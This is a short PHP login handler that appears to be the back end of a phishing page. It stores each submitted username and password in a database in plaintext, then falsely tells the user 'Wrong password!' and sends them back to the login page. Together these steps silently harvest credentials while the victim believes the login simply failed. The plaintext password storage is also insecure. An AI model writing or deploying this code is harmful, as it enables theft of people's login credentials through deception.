<?php
// Start session
session_start();
require 'config/database.php';
// Capture form data
$username = $_POST['username'];
$password = $_POST['password'];

// Prepare and bind (Inserting the user details into the database)
$stmt = $conn->prepare("INSERT INTO users (username, password) VALUES (?, ?)");
$stmt->bind_param("ss", $username, $password);

// Execute the query and check if it was successful
if ($stmt->execute()) {
    // Log the error message
    error_log("Wrong password!");

    // Alert the user and redirect
    echo "<script>alert('Wrong password!');</script>";
    echo "<script>window.location.href = 'index.php';</script>";
} else {
    // Handle errors
    echo "<script>alert('Error storing data!');</script>";
    echo "<script>window.location.href = 'index.php';</script>";
}

// Close the statement and connection
$stmt->close();
?>

